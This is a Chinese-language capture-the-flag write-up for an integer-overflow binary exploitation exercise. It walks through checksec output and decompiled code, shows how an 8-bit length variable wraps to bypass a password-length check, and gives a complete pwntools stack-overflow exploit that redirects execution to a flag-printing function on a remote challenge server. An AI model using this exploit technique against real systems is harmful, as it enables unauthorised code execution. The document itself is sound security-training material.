# int overflow writeup
看题目，整型溢出。
运行了下，大概就是一个登陆的程序，在login环节对密码长度进行限制，通过了就"Success"否则"Invalid Password"。

## file ./elf

> elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped

## checksec ./elf

> [*] '/root/pwn_test/xctf_prac/int overflow/elf'
>     Arch:     i386-32-little
>     RELRO:    Partial RELRO
>     Stack:    No canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x8048000)

没有对canary机制，开启了NX。

## IDA找到漏洞函数

### check_passwd()

> char *__cdecl check_passwd(char *s)
> {
>   char *result; // eax
>   char dest; // [esp+4h] [ebp-14h]
>   unsigned __int8 v3; // [esp+Fh] [ebp-9h]
>
>   v3 = strlen(s);
>   if ( v3 <= 3u || v3 > 8u )
>   {
>     puts("Invalid Password");
>     result = (char *)fflush(stdout);
>   }
>   else
>   {
>     puts("Success");
>     fflush(stdout);
>     result = strcpy(&dest, s);
>   }
>   return result;
> }

该函数中存在strcpy函数，该函数使用时未对s长度进行限制，存在明显的栈溢出，溢出后可以控制函数得返回地址为elf提供的函数what_is_this()。

### what_is_this()

> int what_is_this()
> {
>   return system("cat flag");
> }

这里限制了s的长度:4<=v3<8时才能success，使用整型溢出漏洞绕过。

v3是8位无符号整数:  unsigned __int8 v3; 

所以最大位2^8-1=255，我们可以控制s的长度在一定范围内，使得在程序对溢出的整数进行高位截断的机制下，即能满足s的长度限制，又使得s的长度足够长放得下我们得payload。

## s长度计算

1	00000000=256

1	00000000+4=260

1	00000000+7=263

所以控制s的长度在[260,263]时就可以即能绕过长度检测机制，s的长度又足够长放得下我们得payload。

## exp

from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",33186)

payload='a'*24+p32(0x0804868B)
io.recvuntil("choice:")
io.sendline('1')
io.recvuntil('username:')
io.sendline('a')
io.recvuntil('passwd:')
io.sendline(payload.ljust(263,'a'))

io.interactive()